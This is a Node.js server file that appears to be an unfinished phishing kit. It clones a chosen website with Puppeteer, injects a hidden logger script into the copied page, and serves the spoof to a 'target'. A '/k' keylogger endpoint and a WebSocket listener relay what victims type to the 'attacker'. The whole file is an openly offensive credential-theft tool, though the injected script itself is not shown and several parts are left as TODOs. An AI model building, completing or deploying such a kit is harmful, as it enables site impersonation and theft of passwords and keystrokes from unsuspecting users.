const exp = require('express')
const cheer = require('cheerio').default
const puppet = require('puppeteer')
const fsp = require('fs/promises')
const fs = require('fs')
const http = require('http')
const isURL = require('is-url')
const path = require('path')
const Cache = require('./models/Cache')
const Page = require('./models/Page')
const WebSocket = require('ws')
let spoofURL = "https://www.google.com"
const log = console.log
const PORT = 8888
const app = exp()

//* PAGE CACHES
//TODO: remove tmp testing pages below
let downloaded_page = ''
let rendered_page = ''
// production pages
const page_cache = new Cache() // build new cache object

//* LOGGER
const logger_script = fs.readFileSync(path.join(__dirname,'scripts', 'l.min.js'), 'utf-8')

// check for args
let args = process.argv
if(args[2] && isURL(args[2])){
    log(`URL argument present - ${args[2]}`)
    // set optional arg to spoofURL
    spoofURL = args[2]

} 

// TODO: Move these into Page class so that each instantiated page handles its own lifecycle
async function download_page(url){
    log('Fetching')
    const browser = await puppet.launch() // launch browser
    const page = await browser.newPage() // open page
    await page.goto(spoofURL, {
        waitUntil: "networkidle2"
    })
    downloaded_page = await page.content() // download content
    await page.close() // closes tab
    await browser.close() // close browser
}
function render_page(url){
    log('Rendering page')
//  parse to dom and alter paths
    let dom = cheer.load(downloaded_page)
    // replace image paths
    dom('img').each((i, el)=>{
        let src = el.attribs.src
        let newSrc = spoofURL + src
        log(i + "  " + newSrc)
        el.attribs['src'] = newSrc
    })
    // insert logger script from
    dom('body').append(`<script>${logger_script}</script>`)
    // set rendered page to active html string for main / route
    rendered_page = dom.html()
    createLog(rendered_page)
    log(`${spoofURL} spoof rendered.`)
}



// * PROGRAM ENTRY
async function PROGRAM_START(){
    await download_page()
    render_page()
}
PROGRAM_START()




//* STANDARD SERVER
const server = http.createServer(app)
//* ROUTING SERVER STARTUP
app.set('view engine', 'ejs')
app.set('views', path.join(__dirname, "templates"))
server.listen(PORT, (err) => {
    if (err) log(err)
    log(`Server running on port ${PORT}`)
})
//* WEBSOCKET SERVER
const wss = new WebSocket.Server({server})
wss.on('connection', (ws)=>{
    ws.on('message', (message) => {
        log(message)
    })
})

//* MIDDLEWARE
app.use(exp.urlencoded({extended: false}))
app.use(exp.json())
app.use(exp.static('static'))
app.use('/scripts', exp.static('scripts'))


//* ROUTING

//* SERVE SPOOF TO TARGET
app.get('/:spoof_url', (req, res)=>{
    // 404 on non existant spoof or invalid url
    if(!isURL(req.params.spoof_url)) return res.sendStatus(404)
    if(!page_cache[req.params.spoof_url]) return res.sendStatus(404)
    res.send(page_cache[req.params.spoof_url].rendered_page)
})
//* INITITATE SPOOF AND SERVE LISTENER PAGE TO ATTACKER
app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
    let url_2_spoof = decodeURI(req.body.url)
    log(`Spoof request for __ ${url_2_spoof} __`)
    let spoofPageObject = await create_spoof(url_2_spoof) // should return new path of spoofed page
    // TODO Replace redirect with ejs render function containing listener socket
    return res.render("spoofoutput.ejs", {page: spoofPageObject})
})


//! Handle creation of new pages for caching
async function create_spoof(url){ // creates spoof site and socket session, returns spoof Page object
    let new_page = new Page(url)
    // set into global pages object
    page_cache.addPage(new_page)

    //TODO Create new WS session
   


    return new_page
}
//? KEYLOGGER PATH
app.post('/k', async (req, res)=>{
    // log(req.body.key)

    // handle sending the key to the correct socket session

    return res.sendStatus(200)
})





//* DEBUGGING
// easy to view log of rendered input/output
async function createLog(string){
    let filename = "log.txt"
    await fsp.writeFile(path.join(__dirname, "logs", filename), `rendered page - \n ${string}\ndownloaded page - \n ${downloaded_page}`)

}
